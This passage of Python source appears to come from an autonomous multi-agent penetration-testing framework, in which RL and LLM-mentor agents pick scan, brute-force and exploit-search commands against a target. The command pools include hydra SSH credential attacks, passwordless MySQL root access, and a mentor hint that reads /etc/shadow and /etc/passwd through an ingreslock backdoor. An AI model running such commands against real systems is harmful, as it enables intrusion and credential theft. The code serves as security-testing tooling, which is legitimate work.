        # Handle leading { echo or other wrappers
        if template.startswith("{"):
            # Multi-command block — usually fine (uses echo/telnet/etc.)
            return True
        if template.startswith("for ") or template.startswith("while "):
            return True
        first_word = template.split()[0] if template else ""
        # Strip path prefixes (e.g., /usr/bin/nmap → nmap)
        base_tool = first_word.rsplit("/", 1)[-1]
        return base_tool not in self._unavailable_tools
    
    def _get_blue_agent_command(self, ctx: AttackContext) -> Optional[SmartDecisionResult]:
        """
        BlueAgent gets custom defensive commands - different from attack commands.
        Avoids commands used by other agents this step.
        """
        custom_commands = self.agent_role.get("custom_commands", [])
        if not custom_commands:
            # Fallback
            return None
        
        # Pick a command we haven't used recently AND not used this step
        recent = [d.command for d in self.decisions[-5:]] if self.decisions else []
        available = [c for c in custom_commands 
                     if c[0] not in recent 
                     and c[0][:50] not in self.step_used_commands]
        
        if not available:
            # All used, reset and pick from recent-excluded only
            available = [c for c in custom_commands if c[0] not in recent]
        
        if not available:
            available = custom_commands
        
        cmd, description = random.choice(available)
        
        return SmartDecisionResult(
            command=cmd,
            template_name="blue_defensive",
            params={},
            mentor_call=False,
            mentor_reasoning=f"🛡️ Defensive: {description}",
            confidence=0.75,
            phase=ctx.current_phase,
        )
    
    def _get_orion_coordination(self, ctx: AttackContext, step: int) -> SmartDecisionResult:
        """
        OrionAgent provides strategic coordination commands.
        Analyzes current state and suggests what phase/approach to take.
        Uses step counter to ensure variety and avoid repetition.
        """
        phase = ctx.current_phase
        state_flags = ctx.state_flags
        
        # Build a pool of strategic commands and cycle through them
        strategic_pool = []
        has_http = state_flags.get("http_service_found", False)
        
        if phase == AttackPhase.RECON:
            strategic_pool = [
                (f"nmap -sV -sC --top-ports 1000 {ctx.target}", "🎯 Strategy: Comprehensive port scan with scripts"),
                (f"nmap -sV -A -T4 {ctx.target}", "🎯 Strategy: Aggressive scan with OS detection"),
                (f"nmap -sU --top-ports 100 {ctx.target}", "🎯 Strategy: UDP port discovery"),
                (f"masscan -p1-65535 --rate=1000 {ctx.target}", "🎯 Strategy: Full port coverage at speed"),
                (f"nmap --script=discovery {ctx.target}", "🎯 Strategy: Service discovery scripts"),
            ]
        elif phase == AttackPhase.ENUMERATION:
            strategic_pool = [
                (f"enum4linux -a {ctx.target}", "🎯 Strategy: SMB enumeration"),
                (f"nmap --script=vuln {ctx.target}", "🎯 Strategy: Vulnerability scanning"),
                (f"smbclient -L //{ctx.target} -N", "🎯 Strategy: SMB share listing"),
                (f"nmap --script=smb-enum-shares,smb-enum-users {ctx.target}", "🎯 Strategy: SMB share/user enum"),
            ]
            if has_http:
                strategic_pool.extend([
                    (f"nikto -h http://{ctx.target}", "🎯 Strategy: Web vulnerability scan"),
                    (f"gobuster dir -u http://{ctx.target} -w /usr/share/dirb/wordlists/common.txt -q", "🎯 Strategy: Web directory enumeration"),
                    (f"whatweb -v {ctx.target}", "🎯 Strategy: Web technology fingerprinting"),
                ])
        elif phase == AttackPhase.EXPLOITATION:
            strategic_pool = [
                (f"LANG=C searchsploit --update 2>/dev/null; LANG=C searchsploit linux kernel", "🎯 Strategy: Search for kernel exploits"),
                (f"smbclient //{ctx.target}/tmp -N -c 'ls'", "🎯 Strategy: SMB anonymous share access"),
                (f"hydra -L /usr/share/nmap/nselib/data/usernames.lst -P /usr/share/nmap/nselib/data/passwords.lst ssh://{ctx.target} -t 4", "🎯 Strategy: SSH credential attack"),
                (f"mysql -h {ctx.target} -u root -e 'show databases;' 2>/dev/null", "🎯 Strategy: MySQL default creds"),
            ]
        else:
            strategic_pool = [
                (f"echo '[Orion] Phase: {phase.name} | Ready to coordinate'", f"🎯 Strategy: {phase.name} phase coordination"),
                (f"nmap -sV {ctx.target}", "🎯 Strategy: Re-scan to update intel"),
            ]
        
        # Filter out unavailable tools
        if hasattr(self, '_unavailable_tools'):
            strategic_pool = [
                (cmd, desc) for cmd, desc in strategic_pool
                if cmd.split()[0].split("/")[-1] not in self._unavailable_tools
            ]
        if not strategic_pool:
            strategic_pool = [
                (f"nmap -sV {ctx.target}", "🎯 Strategy: Fallback re-scan"),
            ]
        
        # Cycle through pool based on step to avoid repetition
        idx = step % len(strategic_pool)
        cmd, reasoning = strategic_pool[idx]
        
        return SmartDecisionResult(
            command=cmd,
            template_name="orion_strategic",
            params={"target": ctx.target},
            mentor_call=False,
            mentor_reasoning=reasoning,
            confidence=0.8,
            phase=phase,
        )

    # =====================================================================
    # PHASE 14.0: Hypothesis-driven command selection
    # =====================================================================
    def _p14_hypothesis_select(
        self,
        step_ctx: SmartStepContext,
        filtered_commands: Optional[list] = None,
    ) -> Optional[SmartDecisionResult]:
        """
        Use HypothesisGenerator to select commands that test untested hypotheses.
        Feature-flag gated: only fires when ff.hypothesis_engine is True.
        Returns None if no hypotheses are available or engine is disabled.
        """
        if self._p14_hypothesis_gen is None:
            return None

        try:
            hypotheses = self._p14_hypothesis_gen.get_top_untested(n=1)
            if not hypotheses:
                return None

            hyp = hypotheses[0]
            # Find a matching command from filtered_commands or registry
            target_command = hyp.test_command

            if not target_command:
                return None

            # Build result from hypothesis
            ctx = step_ctx.attack_context
            target = getattr(ctx, 'target_ip', '10.0.0.1') if ctx else '10.0.0.1'
            command = target_command.replace("{target}", target)

            # Mark hypothesis as TESTING
            from core.reasoning.hypothesis import HypothesisStatus
            self._p14_hypothesis_gen.update_status(
                hyp.id, HypothesisStatus.TESTING
            )

            logger.debug(
                f"[P14][HYPO] {self.agent_name}: testing hypothesis "
                f"'{hyp.if_observed}' with '{command[:60]}'"
            )

            return SmartDecisionResult(
                command=command,
                template_name=target_command.split()[0] if target_command else "",
                source="hypothesis",
                confidence=hyp.confidence,
                reasoning=f"Hypothesis: {hyp.if_observed}",
            )
        except Exception as e:
            logger.debug(f"[P14] Hypothesis select failed: {e}")
            return None

    # =====================================================================
    # PHASE 27: Evidence Gate — validate exploit commands against evidence
    # =====================================================================

    def _validate_exploit_evidence(
        self,
        result: SmartDecisionResult,
        discovery_board: Dict[str, Any],
        phase: Any,
    ) -> tuple:
        """
        Validate exploit-phase commands have supporting evidence.

        Returns:
            (valid: bool, reasons: list[str])
        """
        reasons: list = []
        command = (result.command or "").strip()
        if not command:
            return True, []

        # ── Phase 37: Universal evidence gate — block exploit/brute tools when no ports discovered ──
        phase_name = phase.name if hasattr(phase, 'name') else str(phase)
        known_ports = {str(p) for p in discovery_board.get("ports", set())}
        known_services = {str(s).lower() for s in discovery_board.get("services", set())}
        cmd_lower = command.lower()
        cmd_tool = cmd_lower.split()[0].split("/")[-1] if cmd_lower else ""

        # SSH-wrapped commands — assume foothold access, always allow
        if "ssh " in cmd_lower or "sshpass" in cmd_lower:
            reasons.append("ssh_wrapped_command_allowed")
            return True, reasons

        # Post-foothold local commands always pass (any phase)
        _local_cmds = ("sudo", "find", "getcap", "id", "uname", "cat ", "ls ",
                        "whoami", "hostname", "ifconfig", "ip ", "env", "echo ",
                        "grep ", "awk ", "sed ", "head ", "tail ", "which ",
                        "ps ", "netstat", "ss ", "mount", "df ", "lsof",
                        "history", "crontab", "systemctl")
        if any(cmd_lower.startswith(lc) for lc in _local_cmds):
            return True, []

        # Phase 37: If NO ports discovered yet, block all exploit/brute-force/service-specific tools
        _exploit_tools = {"hydra", "medusa", "sqlmap", "msfconsole", "metasploit",
                          "searchsploit", "smbclient", "enum4linux", "rpcclient",
                          "wpscan", "john", "hashcat", "crackmapexec",
                          "impacket", "psexec", "winrm", "evil-winrm"}
        if not known_ports and cmd_tool in _exploit_tools:
            reasons.append(f"no_ports_discovered_yet_cannot_use_{cmd_tool}")
            return False, reasons

        # Phase 37: Block exploit modules referencing non-existent protocols when ports ARE known
        # This runs for ALL phases, not just EXPLOITATION+
        _hallucination_checks = {
            "ircd": {"irc", "ircd", "unreal"},
            "ftp": {"ftp", "vsftpd", "proftpd"},
            "samba": {"smb", "samba", "microsoft-ds"},
            "telnet": {"telnet"},
            "mysql": {"mysql", "mariadb"},
            "postgresql": {"postgresql", "postgres"},
            "vnc": {"vnc"},
            "rmi": {"rmi", "java-rmi"},
        }
        _known_port_set = {int(p) for p in known_ports if str(p).isdigit()}
        _port_service_map = {
            21: "ftp", 22: "ssh", 23: "telnet", 25: "smtp", 80: "http",
            110: "pop3", 139: "smb", 143: "imap", 443: "https", 445: "smb",
            1433: "mssql", 1524: "ingreslock", 3306: "mysql", 3389: "rdp",
            5432: "postgresql", 5900: "vnc", 6667: "irc", 8080: "http",
            8180: "http", 8443: "https",
        }
        if known_ports:  # Only check hallucinations when we have port data
            for _svc_key, _svc_names in _hallucination_checks.items():
                if any(sn in cmd_lower for sn in _svc_names):
                    _svc_found = bool(_svc_names.intersection(known_services))
                    _port_found = any(
                        p in _known_port_set
                        for p, s in _port_service_map.items()
                        if s in _svc_names or s == _svc_key
                    )
                    if not _svc_found and not _port_found:
                        reasons.append(f"hallucination_{_svc_key}_not_on_target")

        # Only apply remaining exploit-phase-specific gates for EXPLOITATION+
        exploit_phases = {"EXPLOITATION", "PRIVILEGE_ESCALATION", "LATERAL_MOVEMENT",
                          "POST_EXPLOITATION", "EXFILTRATION", "CLOSEOUT"}
        if phase_name not in exploit_phases:
            valid = len(reasons) == 0 or all("allowed" in r for r in reasons)
            return valid, reasons

        # Port evidence: if command targets explicit port, check it exists
        import re as _re
        port_patterns = [
            _re.compile(r'-p\s*(\d+)'),        # -p 8080
            _re.compile(r':(\d+)(?:/|\s|$)'),   # host:8080
            _re.compile(r'--port[= ](\d+)'),     # --port=8080
        ]
        for pat in port_patterns:
            m = pat.search(command)
            if m:
                port = m.group(1)
                if port not in known_ports:
                    reasons.append(f"port_{port}_not_in_discovery_board")

        # Service evidence for service-specific tools
        _service_tool_map = {
            "hydra": {"ssh": {"ssh"}, "ftp": {"ftp"}, "smb": {"smb", "samba"},
                      "http": {"http", "https", "web"}},
            "sqlmap": {"_any": {"http", "https", "web"}},
            "nikto": {"_any": {"http", "https", "web"}},
            "ffuf": {"_any": {"http", "https", "web"}},
            "gobuster": {"_any": {"http", "https", "web"}},
            "curl": {"_any": {"http", "https", "web"}},
            "wpscan": {"_any": {"http", "https", "web"}},
            "smbclient": {"_any": {"smb", "samba", "microsoft-ds"}},
            "enum4linux": {"_any": {"smb", "samba", "microsoft-ds"}},
            "rpcclient": {"_any": {"smb", "samba", "microsoft-ds", "rpc"}},
        }
        cmd_tool = cmd_lower.split()[0].split("/")[-1] if cmd_lower else ""
        for tool, svc_map in _service_tool_map.items():
            if tool in cmd_tool:
                for key, required_svcs in svc_map.items():
                    if key == "_any" or key in cmd_lower:
                        if not required_svcs.intersection(known_services):
                            reasons.append(f"service_evidence_missing_for_{tool}")
                        break

        # CVE evidence: if command references CVE, check it in vulns
        cve_match = _re.search(r'CVE-\d{4}-\d+', command, _re.IGNORECASE)
        if cve_match:
            cve_id = cve_match.group().upper()
            known_vulns = {str(v).upper() for v in discovery_board.get("vulns", set())}
            if cve_id not in known_vulns:
                reasons.append(f"cve_{cve_id}_not_in_discovery_board")

        valid = len(reasons) == 0 or all("allowed" in r for r in reasons)
        return valid, reasons

    # =====================================================================
    # P1: Decision Sovereignty — Single Arbitration Method
    # =====================================================================

    def _p1_arbitrate_decision(
        self,
        step_ctx: "SmartStepContext",
        proposed_action: Optional[str],
        confidence: float,
        skill_result: Optional["SmartDecisionResult"],
        playbook_result: Optional["SmartDecisionResult"],
        micro_chain_result: Optional["SmartDecisionResult"],
        phase_guided_result: Optional["SmartDecisionResult"],
        codex_meta_result: Optional["SmartDecisionResult"],
        cognition_decision: Optional["SmartDecisionResult"],
        filtered_commands: Optional[List] = None,
        discovery_board: Optional[Dict[str, Any]] = None,
        gpt_available: bool = False,
        should_call_gpt: bool = False,
        mentor_engagement: Any = None,
        gpt_reason: str = "",
    ) -> Optional["SmartDecisionResult"]:
        """P1: Decision Sovereignty — single arbitration via DecisionCore.

        All source producers have already run and produced their results.
        This method:
        1. Computes deferred sources (web_followup, hypothesis)
        2. Always runs PPO for trajectory building
        3. Gates mentor call via MaturityController
        4. Collects ALL non-None results as Advisory objects
        5. Calls DecisionCore.arbitrate() to pick the single winner
        6. Creates TeacherTrace if mentor was called

        Returns:
            SmartDecisionResult from the winning advisory, or None if
            all sources failed (triggers null-safety fallback in caller).
        """
        if discovery_board is None:
            discovery_board = {}

        # ── 1. Compute deferred sources ──────────────────────────────
        web_followup = self._web_path_followup(step_ctx, discovery_board)
        hyp_result = self._p14_hypothesis_select(step_ctx, filtered_commands)

        # ── 2. Always run PPO for trajectory building ────────────────
        _ppo_result: Optional[SmartDecisionResult] = None
        if self.ppo_agent and self.action_mapper:
            _ppo_result = self._ppo_select_command(step_ctx, filtered_commands)

        # ── 3. Gate mentor call via MaturityController ───────────────
        _mentor_result: Optional[SmartDecisionResult] = None
        _mentor_called = False
        if gpt_available and should_call_gpt:
            _call_mentor = False
            if self._maturity_controller is not None:
                _call_mentor = self._maturity_controller.should_call_mentor(
                    self.agent_name
                )
            else:
                # Fallback: 30% base rate when MaturityController unavailable
                import random as _rand
                _call_mentor = _rand.random() < 0.30

            if _call_mentor:
                _mentor_called = True
                if mentor_engagement is not None and getattr(
                    mentor_engagement, "engage", False
                ):
                    orig_model = self.model
                    self.model = mentor_engagement.model
                    _exfil_hint = (
                        "Focus on data exfiltration via ingreslock backdoor. Try: "
                        "{ echo 'cat /etc/shadow'; sleep 2; } | timeout 10 telnet "
                        "target 1524, { echo 'base64 /etc/passwd'; sleep 2; } | "
                        "timeout 10 telnet target 1524."
                    ) if getattr(mentor_engagement, "exfil_guidance", False) else None
                    _mentor_result = self._decide_with_mentor(
                        step_ctx, proposed_action, confidence, filtered_commands,
                        exfil_prompt=_exfil_hint,
                    )
                    self.model = orig_model
                else:
                    _mentor_result = self._decide_with_mentor(
                        step_ctx, proposed_action, confidence, filtered_commands,
                    )

        # ── 4. Registry fallback advisory ────────────────────────────
        _registry_result = self._decide_from_registry(
            step_ctx, proposed_action, confidence
        )

        # ── 5. Collect all advisories ────────────────────────────────
        # Fallback: if DecisionCore is None, return first non-None result
        if self._decision_core is None:
            for _fb in [
                skill_result, web_followup, playbook_result,
                micro_chain_result, phase_guided_result, codex_meta_result,
                cognition_decision, hyp_result,
                _mentor_result if _mentor_result and getattr(
                    _mentor_result, "mentor_call", False
                ) else None,
                _ppo_result, _registry_result,
            ]:
                if _fb is not None and getattr(_fb, "command", None):
                    return _fb
            return _registry_result

        from core.decision.decision_core import Advisory

        _source_pairs = [
            ("skill", skill_result),
            ("followup", web_followup),
            ("playbook", playbook_result),
            ("micro_chain", micro_chain_result),
            ("phase_guided", phase_guided_result),
            ("codex_meta", codex_meta_result),
            ("cognition", cognition_decision),
            ("hypothesis", hyp_result),
            ("ppo", _ppo_result),
            (
                "mentor",
                _mentor_result
                if _mentor_result
                and getattr(_mentor_result, "mentor_call", False)
                else None,
            ),
            ("registry", _registry_result),
        ]

        _advisories: List[Advisory] = []
        _result_map: Dict[str, SmartDecisionResult] = {}

        # Compute novelty: commands already used this episode get low novelty
        _used = getattr(self, 'episode_used_commands', set())

        for _src_name, _src_res in _source_pairs:
            if _src_res is not None and getattr(_src_res, "command", None):
                _cmd = _src_res.command or ""
                # Novel if command (or its first 40 chars) not in used set
                _cmd_prefix = _cmd[:40]
                _is_novel = (
                    _cmd not in _used
                    and not any(_cmd_prefix == u[:40] for u in _used)
                )
                _advisories.append(
                    Advisory(
                        source=_src_name,
                        command=_cmd,
                        template_name=getattr(_src_res, "template_name", "") or "",
                        confidence=getattr(_src_res, "confidence", 0.5),
                        phase_fit=0.7,
                        novelty=0.8 if _is_novel else 0.05,
                        metadata={"source_key": _src_name},
                    )
                )
                _result_map[_src_name] = _src_res

        if not _advisories:
            return _registry_result

        # ── 6. Get maturity + win rates + RND novelty ────────────────
        _maturity = 0.0
        if self._maturity_controller is not None:
            _ms = getattr(self._maturity_controller, "state", None)
            if _ms is not None:
                _maturity = getattr(_ms, "maturity", 0.0)

        _win_rates: Dict[str, float] = {}
        if hasattr(self, "source_win_rate") and self.source_win_rate is not None:
            for _wr_name, _wr_stats in self.source_win_rate.get_summary().items():
                _win_rates[_wr_name] = _wr_stats.get("ema_win_rate", 0.5)

        _rnd_novelty = 0.0
        _dp = self._current_decision_packet
        if _dp is not None and hasattr(_dp, "rnd") and getattr(
            _dp.rnd, "valid", False
        ):
            _rnd_novelty = getattr(_dp.rnd, "intrinsic_reward", 0.0)

        # ── 7. Arbitrate ─────────────────────────────────────────────
        _stagnation = getattr(self, '_stagnation_steps', 0)
        _arb = self._decision_core.arbitrate(
            _advisories,
            constraints=[],
            maturity=_maturity,
            rnd_novelty=_rnd_novelty,
            source_win_rates=_win_rates,
            stagnation_steps=_stagnation,
        )

        # ── 8. Convert ArbitrationResult → SmartDecisionResult ───────
        _winner_src = _arb.source
        result = _result_map.get(_winner_src)

        if result is None:
            # Winning source not in result map — construct from ArbitrationResult
            result = SmartDecisionResult(
                command=_arb.command,
                template_name=_arb.template_name,
                source=_winner_src,
                confidence=_arb.confidence,
            )

        # ── 9. Mentor suggestion for PPO imitation tracking ──────────
        if _mentor_result is not None and getattr(
            _mentor_result, "mentor_call", False
        ):
            result._mentor_suggestion = _mentor_result.template_name

        # ── 10. TeacherTrace: mentor as teacher, PPO as student ──────
        if (
            _mentor_called
            and _mentor_result is not None
            and getattr(_mentor_result, "mentor_call", False)
            and _ppo_result is not None
            and self._p14_bc_buffer is not None
        ):
            try:
                from core.reasoning.teacher_trace import TeacherTrace

                _state_id = f"ep{self.current_episode}_s{step_ctx.step}"
                _teacher_action_idx = 0
                if self.action_mapper and _mentor_result.template_name:
                    try:
                        _teacher_action_idx = self.action_mapper.command_to_action(
                            _mentor_result.template_name
                        )
                        if _teacher_action_idx < 0:
                            _teacher_action_idx = 0
                    except Exception:
                        _teacher_action_idx = 0

                _student_action_idx = (
                    self._ppo_pending.get("action", 0)
                    if self._ppo_pending
                    else 0
                )
                _student_log_prob = (
                    self._ppo_pending.get("log_prob", 0.0)
                    if self._ppo_pending
                    else 0.0
                )

                _tt = TeacherTrace(
                    state_id=_state_id,
                    state_vector=(
                        self._ppo_pending.get("state", [])
                        if self._ppo_pending
                        else []
                    ),
                    teacher_action_idx=_teacher_action_idx,
                    teacher_command=_mentor_result.command or "",
                    teacher_template=_mentor_result.template_name or "",
                    rationale=_mentor_result.mentor_reasoning or "",
                    confidence=_mentor_result.confidence,
                    student_action_idx=_student_action_idx,
                    student_command=getattr(_ppo_result, "command", "") or "",
                    student_template=getattr(
                        _ppo_result, "template_name", ""
                    ) or "",
                    student_log_prob=_student_log_prob,
                    student_confidence=getattr(
                        _ppo_result, "confidence", 0.0
                    ),
                    episode=self.current_episode,
                    step=step_ctx.step,
                    agent_id=self.agent_name,
                    phase=str(getattr(step_ctx, "phase", "RECON")),
                )
                self._p14_bc_buffer.store(_tt)
                self._p14_traces_this_episode.append(_tt)
                logger.debug(
                    f"[P1] TeacherTrace: div={_tt.compute_divergence():.1f} "
                    f"teacher={_mentor_result.template_name} "
                    f"student={_ppo_result.template_name}"
                )
            except Exception as e:
                logger.debug(f"[P1] TeacherTrace creation failed: {e}")

        # ── 11. Log arbitration trace ────────────────────────────────
        self._step_reasoning_log.append(
            {
                "event": "p1_arbitration",
                "winner": _winner_src,
                "advisories": len(_advisories),
                "scores": {
                    k: round(v, 4) for k, v in _arb.all_scores.items()
                },
                "maturity": round(_maturity, 3),
            }
        )

        logger.debug(
            f"[P1][{self.agent_name}] Arbitrated: winner={_winner_src} "
            f"n={len(_advisories)} maturity={_maturity:.3f}"
        )

        return result

    def _decide_from_registry(
        self,
        step_ctx: SmartStepContext,
        proposed_action: Optional[str],
        confidence: float,
    ) -> SmartDecisionResult:
        """
        Make decision using the command registry with ROLE-BASED filtering.
        
        Each agent picks commands appropriate for their role:
        - ScoutAgent: Recon/discovery commands
        - RedAgent: Exploitation/attack commands  
        - BlueAgent: Defensive monitoring commands
        - OrionAgent: Strategic coordination
        - ShadowAgent: Stealth/persistence commands
        """
        ctx = step_ctx.attack_context
        role_name = self.agent_role.get("role", "generic")
        
        # =====================================================================
        # SPECIAL HANDLING FOR BLUE AGENT (Defensive)
        # =====================================================================
        if role_name == "defensive":
            result = self._get_blue_agent_command(ctx)
            if result:
                return result
        
        # =====================================================================
        # SPECIAL HANDLING FOR ORION (Strategic Coordinator)
        # =====================================================================
        if role_name == "strategic" and self.agent_role.get("is_coordinator"):
            return self._get_orion_coordination(ctx, step_ctx.step)
        
        # =====================================================================
        # ROLE-BASED COMMAND SELECTION (Scout, Red, Shadow)
        # =====================================================================
        
        # Get valid commands for current state
        valid_commands = get_valid_commands_for_state(ctx.state_flags, ctx.current_phase)
        
        if not valid_commands:
            # Try without phase filter
            valid_commands = get_valid_commands_for_state(ctx.state_flags)
        
        # Apply role-based filtering
        filtered_commands = self._filter_commands_for_role(valid_commands)

        # ─── Phase 9.1: Inject knowledge-base suggestions ──────────────
        # Query the knowledge retriever for commands appropriate to the
        # current phase/ports/services, then check if the registry has
        # matching templates. This surfaces real-world exploit paths that
        # the curriculum might not cover.
        try:
            from data.knowledge_retriever import get_knowledge_retriever
            kr = get_knowledge_retriever(lazy=True)
            if kr._loaded:
                _kb_phase_name = (
                    ctx.current_phase.name
                    if ctx and ctx.current_phase else "RECON"
                )
                # Get knowledge suggestions for discovered ports/services
                _kb_suggestions = set()
                # Phase 18: Fix knowledge retrieval — pull actual discovered
                # ports from step_ctx.state["discovery_board"] instead of
                # state_flags (which never contains port_* keys).
                _disc_board = step_ctx.state.get("discovery_board", {}) if step_ctx else {}
                _disc_ports: set = set(_disc_board.get("ports", []))
                if not _disc_ports and ctx:
                    # Fallback: extract from discoveries dict
                    for _dp in ctx.discoveries.get("open_port", []):
                        try:
                            _disc_ports.add(int(_dp))
                        except (ValueError, TypeError):
                            pass
                for _pnum in _disc_ports:
                    try:
                        _svc_entries = kr.by_port(int(_pnum), max_results=3)
                        for _se in _svc_entries:
                            # Entries are dicts with "commands" key
                            _cmds = _se.get("commands", []) if isinstance(_se, dict) else (getattr(_se, "commands", []) or [])
                            _kb_suggestions.update(_cmds[:2])
                    except (ValueError, AttributeError, TypeError):
                        pass
                # Also query by discovered services
                _disc_services = list(_disc_board.get("services", []))
                if not _disc_services and ctx and hasattr(ctx, 'services_found'):
                    _disc_services = list(ctx.services_found) if ctx.services_found else []
                for _svc_name in _disc_services:
                    try:
                        _svc_entries = kr.by_service(
                            str(_svc_name).split("/")[0].strip(), max_results=3)
                        for _se in _svc_entries:
                            _cmds = _se.get("commands", []) if isinstance(_se, dict) else (getattr(_se, "commands", []) or [])
                            _kb_suggestions.update(_cmds[:2])
                    except (ValueError, AttributeError, TypeError):
                        pass

                # Match KB suggestions against registry templates
                if _kb_suggestions and filtered_commands is not None:
                    _existing_names = {c.name for c in filtered_commands}
                    for _vc in valid_commands:
                        if _vc.name not in _existing_names:
                            _template_lower = _vc.template.lower()
                            for _kbs in _kb_suggestions:
                                if _kbs.split()[0].lower() in _template_lower:
                                    filtered_commands.append(_vc)
                                    _existing_names.add(_vc.name)
                                    break
        except Exception:
            pass  # Knowledge base not available — continue without
        
        # =====================================================================
        # PHASE 4: PPO-DRIVEN SELECTION (BEFORE fallback)
        # PPO has its own action mapper per role, can pick even when registry
        # filtering leaves nothing. Moved here so PPO gets first shot.
        # =====================================================================
        if self.ppo_agent and self.action_mapper:
            ppo_result = self._ppo_select_command(step_ctx, filtered_commands if filtered_commands else valid_commands)
            if ppo_result is not None:
                return ppo_result

        if not filtered_commands:
            # =========================================================
            # SMART FALLBACK - Track FULL commands AND unique signatures
            # =========================================================
            step = step_ctx.step
            
            # Track FULL commands to avoid exact repeats + command signatures for variety
            tried_commands = set()
            tried_signatures = set()  # (prefix, key_flags) tuple for detecting similar commands
            if ctx.command_history:
                for cmd in ctx.command_history[-20:]:  # Look at more history
                    tried_commands.add(cmd.strip())
                    parts = cmd.strip().split()
                    if parts:
                        # Create signature from prefix + first 2-3 flags
                        sig = parts[0].lower()
                        if len(parts) > 1:
                            sig += "_" + "_".join(p.lower() for p in parts[1:3] if p.startswith("-"))
                        tried_signatures.add(sig)
            
            if role_name == "recon":
                # COMPREHENSIVE list with diverse tools (not just nmap)
                recon_fallbacks = [
                    # === NETWORK SCANNING (different approaches) ===
                    (f"nmap -sT --top-ports 100 {ctx.target}", "nmap_-st_--top-ports", "🔍 TCP top-100 scan"),
                    (f"nmap -sV -Pn {ctx.target}", "nmap_-sv_-pn", "🔍 Version detection no-ping"),
                    (f"nmap -sU --top-ports 20 {ctx.target}", "nmap_-su_--top-ports", "🔍 UDP scan"),
                    (f"nmap -A -T4 {ctx.target}", "nmap_-a_-t4", "🔍 Aggressive fast scan"),
                    (f"nmap -sT -Pn {ctx.target}", "nmap_-ss_-pn", "🔍 SYN stealth no-ping"),
                    (f"nmap --script discovery {ctx.target}", "nmap_--script_discovery", "🔍 Discovery scripts"),
                    (f"nmap -sC -sV {ctx.target}", "nmap_-sc_-sv", "🔍 Default scripts + version"),
                    (f"nmap -p- --min-rate 5000 {ctx.target}", "nmap_-p-_--min-rate", "🔍 All ports fast"),
                    (f"nmap --script vuln {ctx.target}", "nmap_--script_vuln", "🔍 Vuln scripts"),
                    (f"nmap -sV -sC -O {ctx.target}", "nmap_-sv_-sc", "🔍 Full OS detection"),
                    # === ALTERNATIVE SCANNERS (PRIORITIZE variety) ===
                    (f"masscan -p1-1000 --rate=500 {ctx.target}", "masscan_-p1-1000", "🔍 Fast masscan 1K"),
                    (f"masscan -p1-65535 --rate=2000 {ctx.target}", "masscan_-p1-65535", "🔍 Full port masscan"),
                    (f"masscan -p 21,22,80,443,445,3389 {ctx.target}", "masscan_-p_21", "🔍 Masscan common ports"),
                    (f"rustscan -a {ctx.target} --ulimit 5000 -- -sC", "rustscan_-a", "🔍 Rustscan fast"),
                    # === DNS/OSINT (different queries) ===
                    (f"dig {ctx.target} ANY +noall +answer", "dig_any", "🔍 DNS ANY query"),
                    (f"dig {ctx.target} MX +short", "dig_mx", "🔍 DNS MX records"),
                    (f"dig {ctx.target} NS +short", "dig_ns", "🔍 DNS nameservers"),
                    (f"dig {ctx.target} TXT +short", "dig_txt", "🔍 DNS TXT records"),
                    (f"dig -x {ctx.target} +short", "dig_-x", "🔍 Reverse DNS"),
                    (f"whois {ctx.target}", "whois", "🔍 WHOIS lookup"),
                    (f"host -t A {ctx.target}", "host_-t", "🔍 Host lookup"),
                    # === WEB FINGERPRINTING ===
                    (f"whatweb -a 3 http://{ctx.target}", "whatweb_-a", "🔍 Web fingerprint aggressive"),
                    (f"whatweb http://{ctx.target}:8080", "whatweb_8080", "🔍 Web fingerprint alt port"),
                    (f"curl -sI http://{ctx.target}", "curl_-si", "🔍 HTTP headers"),
                    (f"curl -sI https://{ctx.target} -k", "curl_-si_https", "🔍 HTTPS headers"),
                    (f"wafw00f http://{ctx.target}", "wafw00f", "🔍 WAF detection"),
                    # === PASSIVE/LIGHT PROBES ===
                    (f"ping -c 2 {ctx.target}", "ping_-c", "🔍 Host alive check"),
                    (f"traceroute -n {ctx.target} 2>/dev/null | head -10", "traceroute_-n", "🔍 Network path"),
                    (f"arping -c 2 {ctx.target} 2>/dev/null", "arping_-c", "🔍 ARP probe"),
                ]
                # Filter out commands with matching signatures (NOT just prefixes)
                untried = [(c, sig, r) for c, sig, r in recon_fallbacks 
                           if sig not in tried_signatures and c not in tried_commands]
                
                if untried:
                    cmd, _, reason = random.choice(untried)
                else:
                    # ALL fallbacks exhausted - use STEP-BASED rotation through NON-NMAP tools
                    diverse_rotation = [
                        (f"masscan -p{1000 + step*500}-{1500 + step*500} {ctx.target}", "🔍 Masscan port range"),
                        (f"dig {ctx.target} AAAA +short", "🔍 DNS IPv6"),
                        (f"curl -sI http://{ctx.target}:{80 + step*10}", "🔍 HTTP alt port"),
                        (f"whatweb -v http://{ctx.target}", "🔍 Whatweb verbose"),
                        (f"nmap -sV --top-ports {50 + step*25} {ctx.target}", "🔍 Top ports scaled"),
                        (f"host {ctx.target}", "🔍 Host basic"),
                        (f"nslookup {ctx.target}", "🔍 NS lookup"),
                    ]
                    cmd, reason = diverse_rotation[step % len(diverse_rotation)]
                    logger.warning(f"[{self.agent_name}] All fallbacks used - rotating: {cmd[:40]}...")
                
                return SmartDecisionResult(
                    command=cmd,
                    template_name="nmap_top_ports",
                    params={"target": ctx.target},
                    mentor_call=False,
                    mentor_reasoning=f"{reason}",
                    confidence=0.4,
                    phase=AttackPhase.RECON,
                )
            elif role_name == "offensive":
                # Red agent aggressive fallbacks - EXTENSIVE list with SIGNATURES for dedup
                red_fallbacks = [
                    # Web vulnerability scanning
                    (f"nikto -h http://{ctx.target}", "nikto_-h", "⚔️ Web vuln scan"),
                    (f"nikto -h http://{ctx.target} -Tuning x", "nikto_-tuning", "⚔️ Nikto extended"),
                    (f"nikto -h http://{ctx.target} -C all", "nikto_-c", "⚔️ Nikto all CGI"),
                    # Exploitation frameworks
                    (f"searchsploit linux kernel 5", "searchsploit_linux", "⚔️ Kernel exploit search"),
                    (f"searchsploit apache 2.4", "searchsploit_apache", "⚔️ Apache exploits"),
                    (f"searchsploit ssh", "searchsploit_ssh", "⚔️ SSH exploits"),
                    (f"searchsploit smb", "searchsploit_smb", "⚔️ SMB exploits"),
                    (f"searchsploit wordpress", "searchsploit_wordpress", "⚔️ WP exploits"),
                    (f"searchsploit mysql", "searchsploit_mysql", "⚔️ MySQL exploits"),
                    (f"msfconsole -q -x 'search type:exploit platform:linux; exit'", "msf_linux", "⚔️ MSF linux exploits"),
                    (f"msfconsole -q -x 'search type:exploit platform:windows; exit'", "msf_windows", "⚔️ MSF windows exploits"),
                    # Brute force (different targets)
